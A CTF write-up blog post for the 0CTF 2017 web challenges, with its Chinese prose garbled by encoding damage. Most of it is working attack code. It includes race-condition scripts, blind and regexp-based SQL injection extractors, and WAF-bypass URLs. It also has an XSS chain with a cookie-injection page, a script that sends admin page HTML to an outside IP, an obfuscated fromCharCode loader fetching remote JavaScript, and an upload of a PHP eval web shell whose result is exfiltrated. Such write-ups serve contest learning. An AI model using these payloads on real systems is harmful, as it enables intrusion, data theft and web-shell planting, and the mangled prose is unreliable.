---
title: 0CTF 2017 Web  WriteUP
subtitle: CTF
time: 2017.03.21 10:00:00
layout: post
catalog: true
tags:
- CTF
- Web

excerpt: 0ctf 2017 Webé¢˜ç›®å­¦ä¹ ä¸åˆ†æ

---

# 0CTF



## Temmo's Tiny Shop

è¿™æ˜¯ä¸€ä¸ªå°å‹çš„è´­ç‰©ç½‘ç«™ï¼Œç„¶åå®˜æ–¹çš„è§£æ³•åº”è¯¥æ˜¯å…ˆåˆ·é’±ï¼ˆç«äº‰ï¼Ÿï¼‰ä¹°ä¸€ä¸ªHintï¼Œç„¶åå¾—åˆ°flagæ‰€åœ¨çš„è¡¨ï¼Œå†å¯¹order byåé¢æ•°æ®è¿›è¡Œç›²æ³¨ï¼Œå¾—åˆ°flagã€‚

å¯¹äºç«äº‰ï¼Œæˆ‘ä»¬å‡ ä¸ªäººå°è¯•äº†Nç§ç«äº‰æ–¹å¼ï¼Œè¿˜æ˜¯æ²¡ç«äº‰å‡ºæ¥ååˆ†è¿·ã€‚ï¼ˆå°è¯•çš„æœ‰ï¼ŒBUYå’ŒSALEç›¸äº’ç«äº‰ã€‚å¤šä¸ªPHPSESSIONç›¸äº’ç«äº‰éƒ½ä¸è¡Œorzï¼‰

å…¶ä¸­ä¸€ä¸ªè„šæœ¬

```python
#!/usr/bin/env python
# coding:utf-8
import requests
import time
import threading

#æ‹¼æ¥url
host = "http://202.120.7.197"
url1 = host + "/app.php?action=buy&id=6"
url2 = host + "/app.php?action=sale&id=6"

headers1 = {'Cookie' : 'PHPSESSID=7i10kv9ntqokeuta27hrkh4532'}
headers1 = {'Cookie' : 'PHPSESSID=7i10kv9ntqokeuta27hrkh4533'}
# s = requests.get(url1,headers=headers)
# #æ‰“å°è¿”å›ç»“æœ
# print(s)
# print(s.status_code,s.text)

def buy():
	try:
		while True:
			print requests.get(url1,headers=headers).content
	except:
		pass

def sale():
	try:
		while True:
			print requests.get(url2,headers=headers).content
	except:
		pass



while 1:
	threading.Thread(target=buy).start()
	threading.Thread(target=sale).start()



```



åæ¥ï¼Œå°è¯•admin ç©ºç™»é™†ï¼Œå°±èƒ½å‘ç°å¾ˆå¤šé’±ã€‚è¿·

ä¹°åˆ°HINT,

```
OK! Now I will give some hint: you can get flag by use `select flag from ce63e444b0d049e9c899c9a0336b3c59`
```

æ¥ä¸‹æ¥çš„æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œå°±æ˜¯åœ¨oderé‚£è¾¹æœ‰ä¸€ä¸ªæ³¨å…¥ï¼Œå¾ˆå¤šä¸œè¥¿éƒ½è¢«WAFäº†ï¼Œè€Œä¸”æ²¡æœ‰å›æ˜¾ï¼Œä¸å¯èƒ½æŠ¥é”™æ³¨å…¥ï¼Œåªèƒ½ç›²æ³¨ã€‚

fuzzä¸€æ³¢

è¿‡æ»¤ï¼š

```
' or and ç©ºæ ¼ union sleep || %0a binary /**/ <> = extractvalue floor updatexml
```

()ä¸€èµ·çš„æ—¶å€™å°±ä¼šè¿‡æ»¤

å¯ç”¨ï¼š

```
(xxx) , select as procedure limit asc desc distinct having like (sqlattempt2) & mid substr ascii exists from if
```

å¯ä»¥ç”¨(name)ç»•è¿‡ç©ºæ ¼

æµ‹è¯•ä¸€æ³¢ï¼š

http://202.120.7.197/app.php?action=search&keyword=C&order=(price)desc

http://202.120.7.197/app.php?action=search&keyword=C&order=(price)asc

ä¸¤è€…å‡ºæ¥çš„é¡ºåºä¸åŒï¼Œå¾ˆæ˜¾ç„¶æ˜¯ä¸€ä¸ªorder byåé¢çš„æ³¨å…¥ã€‚



```
202.120.7.197/app.php?action=search&keyword=&order=(1)
{"status":"suc","goods":[{"id":"1","name":"Frostmourn","price":"4000","number":0},{"id":"2","name":"Erwin Schrodinger's Cat","price":"1600","number":0},{"id":"3","name":"!HINT!","price":"8000","number":3},{"id":"4","name":"Backsword","price":"2800","number":2},{"id":"5","name":"Brownie","price":"2200","number":2},{"id":"6","name":"Ice Cream","price":"300","number":2}]}
202.120.7.197/app.php?action=search&keyword=&order=(0)
{"status":"fail","msg":"error occurs or no result here."}
http://202.120.7.197/app.php?action=search&keyword=C&order=if(BOOL,name,price)
æ‰“ç®—åŸºäºè¿™ä¸ªè¿›è¡Œç›²æ³¨(å› ä¸ºæ¯ä¸€ä¸ªæ•°æ®æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥nameï¼Œifï¼ˆtrueï¼Œpriceï¼Œname)è¿™ç§äºŒæ¬¡æ’åºå°±ä¸è¡Œ
202.120.7.197/app.php?action=search&keyword=&order=(if(1,name,price))
{"status":"suc","goods":[{"id":"3","name":"!HINT!","price":"8000","number":3},{"id":"4","name":"Backsword","price":"2800","number":2},{"id":"5","name":"Brownie","price":"2200","number":2},{"id":"2","name":"Erwin Schrodinger's Cat","price":"1600","number":0},{"id":"1","name":"Frostmourn","price":"4000","number":0},{"id":"6","name":"Ice Cream","price":"300","number":2}]}
202.120.7.197/app.php?action=search&keyword=&order=(if(0,name,price))
{"status":"suc","goods":[{"id":"2","name":"Erwin Schrodinger's Cat","price":"1600","number":0},{"id":"5","name":"Brownie","price":"2200","number":2},{"id":"4","name":"Backsword","price":"2800","number":2},{"id":"6","name":"Ice Cream","price":"300","number":2},{"id":"1","name":"Frostmourn","price":"4000","number":0},{"id":"3","name":"!HINT!","price":"8000","number":3}]}
```

è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠæ³¨å…¥ç‚¹æ”¾åœ¨boolé‚£è¾¹

```mysql
202.120.7.197/app.php?action=search&keyword=&order=(if((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),name,price))
æ­£å¸¸è¿”å›ï¼Œè¯´æ˜flagç¡®å®å­˜åœ¨è¿™ä¸ªè¡¨å†…
202.120.7.197/app.php?action=search&keyword=&order=(if(
substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)  
),name,price))
202.120.7.197/app.php?action=search&keyword=&order=(if(ascii(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1)),name,price))

```

> åˆ‡è®°åœ¨æµ‹è¯•çš„æ—¶å€™ä¸€å®šè¦æŠŠ&ç¼–ç ï¼ï¼ï¼å‘äº†å¥½ä¹…

```mysql
202.120.7.197/app.php?action=search&keyword=&order=(if((ascii((substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1)))%261),name,price))
```

å‰è€…ä¸º1çš„æ—¶å€™ï¼Œcontent[32]=='3'

å‰è€…ä¸º0çš„æ—¶å€™ï¼Œcontent[32]=='2'

```python
#!usr/bin/env python
# -*- coding:utf-8 -*-

import requests

session = requests.session()
headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36","Referer":"http://202.120.7.197/","Connection":"close","Accept-Encoding":"gzip, deflate, sdch","Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4,en-GB;q=0.2"}
cookies = {"PHPSESSID":"r18k5gc0mvu94urgd04k8hgbl7"}

url = "http://202.120.7.197/app.php"
payload="if((ascii((substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),{index},1)))&{bit}),name,price)"

list=[1,2,4,8,16,32,64]#ä¸€èˆ¬ä¸ç”¨è€ƒè™‘æœ€é«˜ä½ä¸º1ï¼Œå°±åªéœ€è¦7ä½
result = 0
flag=""
for i in xrange(1,32):
    for bit in list:
        paramsGet={"action":"search","keyword":"",
                   "order":payload.format(index=str(i),bit=bit)}
        res= session.get(url,params=paramsGet,headers=headers,cookies=cookies)
        #print paramsGet
        #print res.content
        if(res.content[32]=="3"):
            result = result|bit
            #print result,bit
    print result
    flag+=chr(result)
    print flag
    result =0 #reset result


```

#### ç«äº‰

çœ‹äº†åˆ«äººçš„WPï¼Œå‘ç°ç¡®å®æ˜¯å¯ä»¥ç«äº‰çš„ã€‚ä¸è¿‡ï¼Œè¿™ä¸ªç«äº‰å’Œæˆ‘ä»¬è€ƒè™‘çš„ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬ä»¥ä¸ºæ˜¯ç”¨å¤šä¸ªé©¬ç”²å·çš„COOKIEå»å–‚ä¸€ä¸ªé©¬ç”²çš„é’±ã€‚ä»–çš„æ„æ€æ˜¯ï¼Œé€šè¿‡ä¸€ä¸ªè´¦æˆ·çš„ä¸åŒcookieå»æ“ä½œã€‚å…ˆç”¨ä¸€ä¸ªcookieä¹°ä¸€ä¸ªæ•°æ®ï¼Œç„¶åå†é€šè¿‡ä¸åŒçš„cookieå–ã€‚å¥½ç¥å¥‡ï¼Œå¥½å¥‡åå°é€»è¾‘æ˜¯æ€ä¹ˆå†™çš„ã€‚

> éš¾é“æ˜¯ï¼Œåœ¨æ”¹å˜è´¦æˆ·é’±çš„æ—¶å€™ï¼Œä¼šå»ç™»é™†è®¤è¯è´¦æˆ·å’Œå¯†ç ã€‚è€Œåœ¨å®é™…ä¹°çš„æ—¶å€™ï¼Œå®ƒåªå¯¹cookieåšäº†è®¤è¯ã€‚è¿™ä¸ªcookieä¸æ ‡å¿—ç”¨æˆ·ï¼Œåªæ ‡å¿—ä¸€ä¸ªæŒç»­çš„ä¼šè¯
>
> è¿™ç§å½¢å¼çš„ç«äº‰ï¼Œä¹Ÿèƒ½è§£é‡Šä¸€å¼€å§‹æ¯”èµ›çš„æ—¶å€™ï¼Œä¸ºä»€ä¹ˆä¼šæœ‰é‚£ä¹ˆå¤šäººçªç„¶é’±å¤šèµ·æ¥äº†ã€‚ã€‚

shå‚è€ƒä»£ç :

```sh
#!/bin/bash
username="moxiaoxi"
password="moxiaoxi"
cookie1="PHPSESSID=gseqg01fg54is7nh733lch3eu1"
cookie2="PHPSESSID=r18k5gc0mvu94urgd04k8hgbl7"
url="http://202.120.7.197/app.php"

curl "$url?action=login" -b $cookie1 -d "username=$username&pwd=$password" &\
curl "$url?action=login" -b $cookie2 -d "username=$username&pwd=$password"

curl "$url?action=buy&id=1" -b $cookie1

curl "$url?action=sale&id=1" -b $cookie1 &\
curl "$url?action=sale&id=1" -b $cookie2

```
å¾ˆç–‘æƒ‘ï¼Œè¿™é‡Œç«Ÿç„¶èƒ½ç™¾åˆ†ç™¾è§¦å‘ï¼Œç„¶åæä¸æ‡‚ä¸ºå•¥æœ¬æ¥çš„è„šæœ¬æ²¡åŠæ³•è§¦å‘ï¼Œå°±æ”¹å†™äº†ä¸€ä¸‹è„šæœ¬ï¼Œè¿›è¡Œæµ‹è¯•ã€‚ 

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
import requests

username = "moxiaoxi"
password = "moxiaoxi"

cookie1 = {"PHPSESSID":"gseqg01fg54is7nh733lch3eu1"}#PHPSESSIDéšæ„
cookie2 = {"PHPSESSID":"r18k5gc0mvu94urgd04k8hgbl7"}

url1 = "http://202.120.7.197/app.php"

paramsLogin ={"action":"login"}
data = {"username":username,"pwd":password}
paramsBuy = {"action":"buy","id":"1"}
paramsSale = {"action":"sale","id":"1"}

res = requests.post(url = url1,params = paramsLogin,data = data,cookies = cookie1)
print res.text
res = requests.post(url = url1,params = paramsLogin,data = data,cookies = cookie2)
print res.text

res = requests.get(url1,params = paramsBuy,cookies = cookie1)
print res.text
res = requests.get(url1,params = paramsSale,cookies = cookie2)
print res.text
res = requests.get(url1,params = paramsSale,cookies = cookie1 )
print res.text
```

å‘ç°è¿™æ ·è¿˜æ˜¯æ²¡åŠæ³•è§¦å‘ã€‚ã€‚

å’Œlouysè®¨è®ºäº†ä¸€ä¸‹ï¼Œå‘ç°ä¸€ä¸ªå‘ç‚¹ã€‚ã€‚

è²Œä¼¼æ˜¯å› ä¸ºrequestsæ˜¯é˜»å¡çš„ï¼Œæ‰€ä»¥ä»–å¾—ä¸€ä¸ªè¯·æ±‚å®Œï¼Œæ‰èƒ½ç»§ç»­è¯·æ±‚ã€‚é˜»å¡å°±ä»£è¡¨çº¿æ€§ï¼Œæ²¡æœ‰ç«äº‰ã€‚

![zuse](http://momomoxiaoxi.com/img/post/0ctf/zuse.png)

è€Œcurlæ˜¯ä¸é˜»å¡çš„ï¼Œç›´æ¥å‘åŒ…çš„

![louys](http://momomoxiaoxi.com/img/post/0ctf/louys.png)

æ”¹å†™ä¸€æ³¢paylaod

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
import requests
import threading

username = "moxiaoxi"
password = "moxiaoxi"

cookie1 = {"PHPSESSID":"gseqg01fg54is7nh733lch3eu1"}#PHPSESSIDéšæ„
cookie2 = {"PHPSESSID":"r18k5gc0mvu94urgd04k8hgbl7"}

url1 = "http://202.120.7.197/app.php"

paramsLogin ={"action":"login"}
data = {"username":username,"pwd":password}
paramsBuy = {"action":"buy","id":"1"}
paramsSale = {"action":"sale","id":"1"}

session1 = requests.session()
session2 = requests.session()

res = session1.post(url = url1,params = paramsLogin,data = data,cookies = cookie1)
print res.text
res = session1.post(url = url1,params = paramsLogin,data = data,cookies = cookie2)
print res.text

# res = session1.get(url1,params = paramsBuy,cookies = cookie1)
# print res.text
# res = session1.get(url1,params = paramsSale,cookies = cookie2)
# print res.text
# res = session1.get(url1,params = paramsSale,cookies = cookie1 )
# print res.text

def buy():
	res = session1.get(url1,params = paramsBuy,cookies = cookie1)
	print res.text

def sale():
	res = session1.get(url1,params = paramsSale,cookies = cookie2)
	print res.text
	res = session1.get(url1,params = paramsSale,cookies = cookie1 )
	print res.text

def main():
	while True:
		t1 = threading.Thread(target=buy)
	  	t2 = threading.Thread(target=sale)
	  	t3 = threading.Thread(target=sale)
	  	t1.start()
	  	t2.start()
	  	t3.start()

	  	t1.join()
	  	t2.join()
	  	t3.join()

if __name__ == '__main__':
	main()

```

æµ‹è¯•ä¸€ä¸‹ï¼Œæœç„¶æ˜¯**é˜»å¡**çš„é—®é¢˜ã€‚é€šè¿‡è¿™ç§æ–¹å¼å¯ä»¥å¼¥è¡¥ä¸€ä¸‹é˜»å¡ï¼Œä½†æ˜¯è§¦å‘æœºç‡æ²¡æœ‰curlé«˜ã€‚

![race](http://momomoxiaoxi.com/img/post/0ctf/race.png)



### ç”¨æ­£åˆ™è·å¾—æ•°æ®

> è¿™æ˜¯å­¦ä¹ ä¸€ä¸ªæ—¥æœ¬å°å“¥çš„WPå­¦ä¹ åˆ°çš„æ€è·¯ï¼Œé¢ è¦†äº†æˆ‘å¯¹sqlç›²æ³¨çš„æ¦‚å¿µ

[https://st98.github.io/diary/posts/2017-03-20-0ctf-2017-quals.html](https://st98.github.io/diary/posts/2017-03-20-0ctf-2017-quals.html)

payloadå¦‚ä¸‹

```python
import requests
import sys

def check(s):
  if 'WAF' in s:
    raise Exception('WAF~><')
  if 'login plz' in s:
    raise Exception('login plz~><')
  return 'suc' in s

url = 'http://202.120.7.197/app.php?action=search&keyword=_&order=cot(if((%s)regexp(0x%s),1,0))'

print url % (sys.argv[1], sys.argv[2].encode('hex'))
print check(requests.get(url % (sys.argv[1], sys.argv[2].encode('hex')), cookies={
  'PHPSESSID': 'xxx'
}).content)
```

```
python2 s.py "select(substr(flag,4,1))from(ce63e444b0d049e9c899c9a0336b3c59)" "[a-z]"
```

è¿™æ ·å°±èƒ½ä¾æ¬¡é€šè¿‡æ­£åˆ™è·å¾—æ•°æ®äº†,å§¿åŠ¿éå¸¸ä¼˜é›…

![rce](http://momomoxiaoxi.com/img/post/0ctf/rce.png)



## simplesqlin

å¾ˆæ˜æ˜¾çš„sqlæ³¨å…¥

ç”¨%0bç»•è¿‡

http://202.120.7.203/index.php?id=-1%20union%20se%0blect%201,(sel%0bect%20flag%20fr%0bom%20flag),3



è¿˜æœ‰%00ä¹Ÿå¯ä»¥



### KOG

æœ€è¿‘æ²¡é‚£ä¹ˆå¤šç²¾åŠ›ï¼Œæš‚æ—¶ä¸çœ‹äº†ã€‚åé¢æœ‰æ—¶é—´è¡¥å……å§ã€‚

https://jiulongw.github.io/post/0ctf-2017-kog/

æ€è·¯å¥½åƒæ˜¯èƒ½é€šè¿‡è°ƒè¯•å™¨å¾—åˆ°å“ˆå¸Œå€¼ï¼Œä»è€Œä¼ªé€ ï¼Œè¿›è¡Œsqlæ³¨å…¥

sqlæ³¨å…¥æ²¡æœ‰è¿‡æ»¤ä»»ä½•ä¸œè¥¿ï¼Œä¸»è¦å°±æ˜¯è€ƒéªŒchromeè°ƒè¯•èƒ½åŠ›ã€‚

### Compliacted xss

é€šè¿‡è¿™ä¸ªè„šæœ¬çˆ†ç ´md5éªŒè¯ç 

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
import hashlib
i = 0
while(True):
	s = str(i)
	test = hashlib.md5(s).hexdigest()
	if test.startswith('c2d7c9'):
		print '[!]', 'found:', s,test
		break
	i+=1



```

è¿™é¢˜çš„å¤§ä½“æ„æ€æ˜¯ï¼š

http://government.vip/

ä¼šç»™æˆ‘ä»¬ä¸€ä¸ªå¯ä»¥xssçš„è¾“å…¥æ¡†ï¼Œè¾“å…¥çš„ä¸œè¥¿ä¼šè¢«åå°è½¬ä¸ºhtmlï¼Œç„¶åadminä¼šå»è®¿é—®è¿™ä¸ªé¡µé¢å¯¼è‡´XSSã€‚

 http://admin.government.vip:8000

æç¤ºéœ€è¦ä¸Šä¼ shellã€‚ç”¨burpsuiteæŠ“åŒ…ï¼Œå¯ä»¥å‘ç°cookieä¸­çš„usernameå¯ä»¥æ§åˆ¶é¡µé¢ä¸Šçš„ä¸œè¥¿(test)

```html
<h1>Hello test</h1>
```

ç„¶åï¼Œæœ€åŸºæœ¬çš„æ€è·¯å°±æ˜¯åœ¨government.vipä¸Šè·¨åŸŸæ§åˆ¶ä¸€ä¸ªcookieï¼Œå»è®¿é—®admin.government.vip:8000

æˆ‘åŸºæœ¬å¯¹xssä¸æ˜¯å¾ˆäº†è§£ï¼Œåšäº†å¾ˆä¹…å¾ˆä¹…ã€‚ã€‚

åæ¥ï¼Œlouysç»™äº†ä¸€ä¸ªæç¤ºï¼Œå…¶å®æ˜¯å¯ä»¥è·¨åŸŸå¸¦cookieè®¿é—®çš„ã€‚

æ•´ä¸ªæ€è·¯å¤§ä½“æ˜¯è¿™æ ·ï¼Œiframeä¸¤ä¸ªç›¸åŒçš„ä½†çˆ¶é¡µé¢ä¸åŒåŸŸçš„ç½‘é¡µï¼Œè¿™ä¸¤ä¸ªiframeæ˜¯åŒåŸŸï¼Œå¯ä»¥äº’ç›¸é€šä¿¡ï¼Œè®¿é—®ã€‚

> è¿™é‡Œç”±äºä¸¤ä¸ªiframeçš„å†…å®¹æ˜¯åŒåŸŸçš„ï¼Œè™½ç„¶å’Œçˆ¶é¡µä¸åŒåŸŸï¼Œä½†æ˜¯æ ¹æ®åŒæºç­–ç•¥ä¸¤ä¸ªiframeç›¸äº’æ˜¯å¯ä»¥è®¿é—®å¯¹æ–¹çš„èµ„æºçš„

é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨æˆ‘ä»¬çš„é¡µé¢æ§åˆ¶åœ¨è®¿é—®ç¬¬äºŒä¸ªiframeçš„æ—¶å€™æ—¶ï¼Œadminå¸¦çš„cookeiå€¼ï¼Œä»è€Œå¯ä»¥è§¦å‘ç¬¬äºŒä¸ªé¡µé¢çš„xss

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
    </head>
    <body>
     <script>
    function get()
    {
        var payload = "<script src='http://106.14.61.185/files/a.js'>"+"</s"+"cript>;";//payloadæ‰€åœ¨
        document.cookie="username=" + payload + " domain=.government.vip; path=/";
        document.body.appendChild(document.createElement('iframe')).src='http://admin.government.vip:8000';
        //location.href = "http://admin.government.vip:8000/";
    }
    </script>
      <iframe src="http://admin.government.vip:8000" onload="get()"></iframe>
    </body>
</html>
```

a.js

```js
location.href = "http://106.14.61.185:8080/date.php?xss="+escape(window.top.frames[0].document.documentElement.innerHTML)
```

å¯ä»¥æ‰“åˆ°adminé¡µé¢çš„æ•°æ®ï¼ˆè¿™é‡Œæ‰“åˆ°çš„æ˜¯ç¬¬ä¸€ä¸ªframeçš„æ•°æ®ï¼‰

```http
[root@iZuf6ct8pmbo8u22rq5e5oZ ~]# nc -l 8080
GET /date.php?xss=%3Chead%3E%0A%3Ctitle%3EAdmin%20Panel%3C/title%3E%0A%3Cscript%3E%0A//sandbox%0Adelete%20window.Function%3B%0Adelete%20window.eval%3B%0Adelete%20window.alert%3B%0Adelete%20window.XMLHttpRequest%3B%0Adelete%20window.Proxy%3B%0Adelete%20window.Image%3B%0Adelete%20window.postMessage%3B%0A%3C/script%3E%0A%3C/head%3E%0A%0A%3Cbody%3E%3Ch1%3EHello%20admin%3C/h1%3E%0A%0A%0A%3Cp%3EUpload%20your%20shell%3C/p%3E%0A%3Cform%20action%3D%22/upload%22%20method%3D%22post%22%20enctype%3D%22multipart/form-data%22%3E%0A%3Cp%3E%3Cinput%20type%3D%22file%22%20name%3D%22file%22%3E%3C/p%3E%0A%3Cp%3E%3Cinput%20type%3D%22submit%22%20value%3D%22upload%22%3E%0A%3C/p%3E%3C/form%3E%0A%3C/body%3E HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://admin.government.vip:8000/
User-Agent: Mozilla/5.0 Chrome(phantomjs) for 0ctf2017 by md5_salt
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: 106.14.61.185:8080
```

è§£ç 

```html
<head>
<title>Admin Panel</title>
<script>
//sandbox
delete window.Function;
delete window.eval;
delete window.alert;
delete window.XMLHttpRequest;
delete window.Proxy;
delete window.Image;
delete window.postMessage;
</script>
</head>

<body><h1>Hello admin</h1>


<p>Upload your shell</p>
<form action="/upload" method="post" enctype="multipart/form-data">
<p><input type="file" name="file"></p>
<p><input type="submit" value="upload">
</p></form>
```

ç„¶åï¼Œå°±è¿›å…¥ä¸€ä¸ªæ·±å‘ã€‚ã€‚å› ä¸ºç¦ç”¨äº†å¾ˆå¤šä¸œè¥¿ã€‚ã€‚ã€‚æˆ‘å¼±æ¸£çš„JSæ°´å¹³ï¼Œå®Œå…¨ä¸ä¼šä¸Šä¼ ã€‚

åæ¥ï¼Œç½‘ä¸Šå¶ç„¶ç¿»åˆ°ä¸€ä¸ªæ¯”è¾ƒç›¸ä¼¼çš„payloadï¼Œä»–ç”¨äº†iframeçš„ä¼ªåè®®ç»•è¿‡äº†è¿™ä¸ªdelete.

æµ‹è¯•äº†ä¸€æ³¢

```html
<!doctype html>
<head>
<title>Admin Panel</title>
<script>
//sandbox
delete window.Function;
delete window.eval;
delete window.alert;
delete window.XMLHttpRequest;
delete window.Proxy;
delete window.Image;
delete window.postMessage;
</script>
</head>

<h1>Hello <iframe src='javascript:eval(alert(1))'></iframe></h1>


<p>Upload your shell</p>
<form action="/upload" method="post" enctype="multipart/form-data">
<p><input type="file" name="file"></input></p>
<p><input type="submit" value="upload">
</form>
```

![0ctf](http://momomoxiaoxi.com/img/post/0ctf/0ctf.png)

å‘ç°iframeçš„ä¼ªåè®®å¯ä»¥ç»•è¿‡ï¼Œè°ƒç”¨è¢«ç¦ç”¨çš„å‡½æ•°ã€‚ï¼ˆè¿˜æ²¡ææ‡‚ä¸ºå•¥å¯ä»¥ç»•è¿‡ï¼Œæœ‰çŸ¥é“çš„ï¼Œæ±‚è§£ç­”ä¸€æ³¢ï½ï¼‰

ç„¶åï¼Œå°±æƒ³ç€é€šè¿‡iframeçš„ä¼ªåè®®è°ƒç”¨ä¸€ä¸ªå¤–éƒ¨çš„jsï¼Œå¤–éƒ¨çš„jsæ‰§è¡Œä¸Šä¼ shellçš„æ“ä½œã€‚

æœ¬åœ°æµ‹è¯•ä¸€æ³¢

```html
<!doctype html>
<head>
<title>Admin Panel</title>
<script>
//sandbox
delete window.Function;
delete window.eval;
delete window.alert;
delete window.XMLHttpRequest;
delete window.Proxy;
delete window.Image;
delete window.postMessage;
</script>
</head>

<h1>Hello <iframe src='javascript:eval(String.fromCharCode(118, 97, 114, 32, 115, 115, 115, 61, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 115, 99, 114, 105, 112, 116, 34, 41, 59, 115, 115, 115, 46, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 54, 46, 49, 52, 46, 54, 49, 46, 49, 56, 53, 47, 102, 105, 108, 101, 115, 47, 120, 115, 115, 46, 106, 115, 34, 59, 100, 111, 99, 117, 109, 101, 110, 116, 46, 98, 111, 100, 121, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 115, 115, 41, 59))'></iframe></h1>


<p>Upload your shell</p>
<form action="/upload" method="post" enctype="multipart/form-data">
<p><input type="file" name="file"></input></p>
<p><input type="submit" value="upload">
</form>
```

```js
String.fromCharCode(118, 97, 114, 32, 115, 115, 115, 61, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 115, 99, 114, 105, 112, 116, 34, 41, 59, 115, 115, 115, 46, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 54, 46, 49, 52, 46, 54, 49, 46, 49, 56, 53, 47, 102, 105, 108, 101, 115, 47, 120, 115, 115, 46, 106, 115, 34, 59, 100, 111, 99, 117, 109, 101, 110, 116, 46, 98, 111, 100, 121, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 115, 115, 41, 59)
var sss=document.createElement("script");sss.src="http://106.14.61.185/files/xss.js";document.body.appendChild(sss);
```

xss.jså°±æ˜¯å®ç°ä¸€ä¸ªä¸Šä¼ é€»è¾‘

```js
function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://admin.government.vip:8000/upload", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------32762167253918");
        xhr.withCredentials = true;
        var body = "-----------------------------32762167253918\r\n" +
          "Content-Disposition: form-data; name=\"file\"; filename=\"1.php\"\r\n" +
          "Content-Type: application/octet-stream\r\n" +
          "\r\n" +
          "\x3c?php eval($_GET[\'test\']);?\x3e\r\n" +
          "-----------------------------32762167253918--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);

        xhr.onload=function(e)
        {
            (new Image()).src='http://106.14.61.185:7778/index.php?'+xhr.response;
        }
        xhr.send(new Blob([aBody]));
      }
submitRequest();
```

![testlocal](http://momomoxiaoxi.com/img/post/0ctf/testlocal.png)

å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®ä¸Šä¼ æ˜¯è¢«æ‰§è¡Œäº†ï¼Œä½†æ˜¯å› ä¸ºä¸æ˜¯åŒæºæ‰€ä»¥é˜»å¡äº†ã€‚ä¸Šä¼ ç»™adminï¼Œadminè°ƒç”¨çš„æ—¶å€™ï¼Œå°±èƒ½æ­£å¸¸æ‰§è¡Œ

æœ€åçš„payload

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
    </head>
    <body>
     <script>
    function get()
    {
        var payload = "<iframe src='javascript:eval(String.fromCharCode(118,97,114,32,115,115,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,115,115,115,46,115,114,99,61,34,104,116,116,112,58,47,47,49,48,54,46,49,52,46,54,49,46,49,56,53,47,102,105,108,101,115,47,120,115,115,46,106,115,34,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,115,115,41,59))'>"+"</i"+"frame>;";//payloadæ‰€åœ¨
        document.cookie="username=" + payload + " domain=.government.vip; path=/";
        document.body.appendChild(document.createElement('iframe')).src='http://admin.government.vip:8000';
        //location.href = "http://admin.government.vip:8000/";
    }
    get();
    </script>
    </body>
</html>
```

å¾—åˆ°flag{xss_is_fun_2333333}

è¿™é‡Œçš„å‘ï¼š

å› ä¸ºæ˜¯Xåœ¨cookieé‡Œé¢ï¼Œè®°å¾—ç»™iframeæ ‡ç­¾åé¢åŠ ä¸€ä¸ªåˆ†å·ã€‚

ä¼ªåè®®ç»•è¿‡deleteå­¦ä¹ ä¸€æ³¢

å¸¦cookieçš„è®¿é—®

ä¸€å¼€å§‹å†™äº†ä¸ªphpç•Œé¢ï¼Œä¸Šä¼ ï¼Œä¸€ç›´ä¸è¡Œ

XSSè·¨åŸŸ

#### å…¶ä»–ç»•è¿‡æ–¹å¼

å‘iframeå€Ÿç”¨ä¸€ä¸ªXMLHttpRequestæ¥ç»•è¿‡delete

```html
var frame = document.createElement('iframe');
document.body.appendChild(frame);
window.XMLHttpRequest = frame.contentWindow.XMLHttpRequest;
```





## simpleXSS

> This simulates a real world xss. It's a simple one and took me 2-3 hours to solve this. Good luck!
>
> https://router.vip/
>
> Simple?????naiveã€‚ã€‚
>
> è´´è¿‘å®æˆ˜ï¼Ÿè›¤ï¼Ÿ
>
> æ€¼åˆ°äº†å‡Œæ™¨4ç‚¹ã€‚ã€‚ã€‚è¿˜æ˜¯æ²¡åšå‡ºæ¥ï¼Œæ€€ç–‘äººç”Ÿ

